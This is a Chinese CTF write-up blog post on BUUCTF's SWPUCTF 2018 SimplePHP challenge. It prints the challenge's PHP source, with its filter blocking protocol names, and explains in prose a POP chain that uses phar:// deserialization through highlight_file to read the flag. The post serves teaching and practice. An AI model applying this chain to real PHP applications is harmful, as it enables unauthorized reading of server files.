@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="checkline 基本功能调试。有上传，有查看，初步猜测文件上传漏洞(然并，后来发现是反序列化)。 查看url，源码。有file参数，输入文件名，发现文件泄露。可以查看源码。审计file.php1234567891011121314151617&lt;?php header(&quot;content-type:text&#x2F;html;charset&#x3D;utf-8&quot;);  include &amp;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUCTF-WEB-SWPUCTF-2018-SimplePHP-phar触发反序列化">
+<meta property="og:url" content="http://example.com/2022/05/25/BUUCTF-WEB-SWPUCTF-2018-SimplePHP-phar%E8%A7%A6%E5%8F%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="Imp1ture">
+<meta property="og:description" content="checkline 基本功能调试。有上传，有查看，初步猜测文件上传漏洞(然并，后来发现是反序列化)。 查看url，源码。有file参数，输入文件名，发现文件泄露。可以查看源码。审计file.php1234567891011121314151617&lt;?php header(&quot;content-type:text&#x2F;html;charset&#x3D;utf-8&quot;);  include &amp;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2022/05/25/BUUCTF-WEB-SWPUCTF-2018-SimplePHP-phar%E8%A7%A6%E5%8F%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2022-05-25-19-20-30.png">
+<meta property="og:image" content="http://example.com/2022/05/25/BUUCTF-WEB-SWPUCTF-2018-SimplePHP-phar%E8%A7%A6%E5%8F%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2022-05-25-19-23-09.png">
+<meta property="article:published_time" content="2022-05-25T09:01:52.000Z">
+<meta property="article:modified_time" content="2022-05-25T11:37:42.289Z">
+<meta property="article:author" content="Imp1ture">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/05/25/BUUCTF-WEB-SWPUCTF-2018-SimplePHP-phar%E8%A7%A6%E5%8F%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2022-05-25-19-20-30.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>BUUCTF-WEB-SWPUCTF-2018-SimplePHP-phar触发反序列化</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">文章</a></li><!--
+     --><!--
+       --><li><a href="/tags/">分类</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2022/05/26/MISC-tips/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2022/05/24/BUUCTF-WEB-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%99%BD%E8%99%8E%E7%BB%84-PicDown-linux%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E7%9F%A5%E8%AF%86/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/05/25/BUUCTF-WEB-SWPUCTF-2018-SimplePHP-phar%E8%A7%A6%E5%8F%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/05/25/BUUCTF-WEB-SWPUCTF-2018-SimplePHP-phar%E8%A7%A6%E5%8F%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&text=BUUCTF-WEB-SWPUCTF-2018-SimplePHP-phar触发反序列化"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/05/25/BUUCTF-WEB-SWPUCTF-2018-SimplePHP-phar%E8%A7%A6%E5%8F%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=BUUCTF-WEB-SWPUCTF-2018-SimplePHP-phar触发反序列化"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/05/25/BUUCTF-WEB-SWPUCTF-2018-SimplePHP-phar%E8%A7%A6%E5%8F%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&is_video=false&description=BUUCTF-WEB-SWPUCTF-2018-SimplePHP-phar触发反序列化"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=BUUCTF-WEB-SWPUCTF-2018-SimplePHP-phar触发反序列化&body=Check out this article: http://example.com/2022/05/25/BUUCTF-WEB-SWPUCTF-2018-SimplePHP-phar%E8%A7%A6%E5%8F%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/05/25/BUUCTF-WEB-SWPUCTF-2018-SimplePHP-phar%E8%A7%A6%E5%8F%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=BUUCTF-WEB-SWPUCTF-2018-SimplePHP-phar触发反序列化"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/05/25/BUUCTF-WEB-SWPUCTF-2018-SimplePHP-phar%E8%A7%A6%E5%8F%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=BUUCTF-WEB-SWPUCTF-2018-SimplePHP-phar触发反序列化"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/05/25/BUUCTF-WEB-SWPUCTF-2018-SimplePHP-phar%E8%A7%A6%E5%8F%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=BUUCTF-WEB-SWPUCTF-2018-SimplePHP-phar触发反序列化"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/05/25/BUUCTF-WEB-SWPUCTF-2018-SimplePHP-phar%E8%A7%A6%E5%8F%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=BUUCTF-WEB-SWPUCTF-2018-SimplePHP-phar触发反序列化"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/05/25/BUUCTF-WEB-SWPUCTF-2018-SimplePHP-phar%E8%A7%A6%E5%8F%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&name=BUUCTF-WEB-SWPUCTF-2018-SimplePHP-phar触发反序列化&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/05/25/BUUCTF-WEB-SWPUCTF-2018-SimplePHP-phar%E8%A7%A6%E5%8F%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&t=BUUCTF-WEB-SWPUCTF-2018-SimplePHP-phar触发反序列化"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#checkline"><span class="toc-number">1.</span> <span class="toc-text">checkline</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%A1%E8%AE%A1"><span class="toc-number">2.</span> <span class="toc-text">审计</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">3.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        BUUCTF-WEB-SWPUCTF-2018-SimplePHP-phar触发反序列化
+    </h1>
+
+
+
+	
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Imp1ture</span>
+      </span>
+	  <!--Leancloud 阅读量-->
+	  
+	<span id="/2022/05/25/BUUCTF-WEB-SWPUCTF-2018-SimplePHP-phar%E8%A7%A6%E5%8F%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="leancloud-visitors" data-flag-title="BUUCTF-WEB-SWPUCTF-2018-SimplePHP-phar触发反序列化">
+		<em class="post-meta-item-text">阅读量</em>
+		<i class="leancloud-visitors-count">loading</i>
+	</span>
+
+
+
+	  
+	  <!--Leancloud 阅读量-->
+	  
+      
+    <div class="postdate">
+      
+        <time datetime="2022-05-25T09:01:52.000Z" itemprop="datePublished">2022-05-25</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/ctf/" rel="tag">ctf</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="checkline"><a href="#checkline" class="headerlink" title="checkline"></a>checkline</h2><ol>
+<li>基本功能调试。有上传，有查看，初步猜测文件上传漏洞(然并，后来发现是反序列化)。</li>
+<li>查看url，源码。有file参数，输入文件名，发现文件泄露。可以查看源码。<h2 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h2>file.php<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);  </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;function.php&#x27;</span>; </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>; <span class="comment">//重点文件</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/var/www/html/&#x27;</span>);<span class="comment">//泄露了上传路径 </span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>] ? <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] : <span class="string">&quot;&quot;</span>; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$file</span>)) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$show</span> = <span class="keyword">new</span> <span class="title class_">Show</span>(); </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>)) &#123; </span><br><span class="line">    <span class="variable">$show</span>-&gt;source = <span class="variable">$file</span>; <span class="comment">//将上传的文件名赋值给shiw-&gt;source</span></span><br><span class="line">    <span class="variable">$show</span>-&gt;<span class="title function_ invoke__">_show</span>(); <span class="comment">//调用_show方法，这里已经能感觉是发序列化漏洞了。</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$file</span>))&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;file doesn\&#x27;t exists.&#x27;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+function.php<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//show_source(__FILE__); </span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;base.php&quot;</span>; </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type: text/html;charset=utf-8&quot;</span>); </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_do</span>(<span class="params"></span>) </span>&#123; <span class="comment">//创建沙盒文件夹</span></span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>; </span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>].<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]).<span class="string">&quot;.jpg&quot;</span>; </span><br><span class="line">    <span class="comment">//mkdir(&quot;upload&quot;,0777); </span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>)) &#123; </span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>); </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;&#x27;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">upload_file_check</span>()) &#123; </span><br><span class="line">        <span class="title function_ invoke__">upload_file_do</span>(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_check</span>(<span class="params"></span>) </span>&#123; <span class="comment">//检查后缀</span></span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>; </span><br><span class="line">    <span class="variable">$allowed_types</span> = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;jpeg&quot;</span>,<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;png&quot;</span>); </span><br><span class="line">    <span class="variable">$temp</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>,<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]); </span><br><span class="line">    <span class="variable">$extension</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$temp</span>); </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$extension</span>)) &#123; </span><br><span class="line">        <span class="comment">//echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;; </span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$extension</span>,<span class="variable">$allowed_types</span>)) &#123; </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;</span>; </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+class.php<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;str = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test = <span class="variable language_">$this</span>-&gt;str;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test; <span class="comment">//可以出发tosring</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;   <span class="comment">//$this-&gt;source = phar://phar.jpg</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="variable language_">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;source;<span class="comment">//很奇怪的引用，猜测是pop链上的一环</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>,<span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$key</span> = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;</span>,<span class="variable language_">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="variable language_">$this</span>-&gt;source);<span class="comment">//hightlight_file可以触发phar发序列化</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="variable language_">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker~&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)//访问对象不存的属性时触发</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$key</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;params[<span class="variable">$key</span>])) &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;params[<span class="variable">$key</span>];<span class="comment">//赋值给value</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">file_get</span>(<span class="variable">$value</span>);<span class="comment">//</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span>(<span class="params"><span class="variable">$value</span></span>) //返回<span class="title">value</span>文件内容，并对内容</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$text</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$value</span>));<span class="comment">//返回文件内容</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$text</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">我们构想利用链，需要用到file_get_contents，那么需要用到file_get，同时要<span class="variable">$value</span>=<span class="string">&#x27;flag路径&#x27;</span>，那么就用到<span class="title function_ invoke__">get</span>()，因为<span class="title function_ invoke__">get</span>()返回<span class="title function_ invoke__">file_get</span>(<span class="variable language_">$this</span>-&gt;params[<span class="variable">$key</span>])，所以需要<span class="variable language_">$this</span>-&gt;params[<span class="variable">$key</span>]=<span class="string">&#x27;flag路径&#x27;</span>，进而需要调用<span class="title function_ invoke__">__get</span>()时，<span class="variable">$key</span>的名称还需要看前面。</span><br><span class="line">利用show对象里面的__tostring，令<span class="variable language_">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]为一个test对象，进而可以出发test里面的<span class="title function_ invoke__">__get</span>(<span class="string">&#x27;source&#x27;</span>)，我们再令<span class="variable language_">$this</span>-&gt;params[<span class="string">&#x27;source&#x27;</span>]=<span class="string">&#x27;flag路径&#x27;</span>，进而可以获取flag的内容。怎么触发__tostring呢。利用C1e4r对象中的__destruct，怎么出发这个呢，利用Show对象中的_show的hightlight_file，配合phar协议触发。</span><br></pre></td></tr></table></figure>
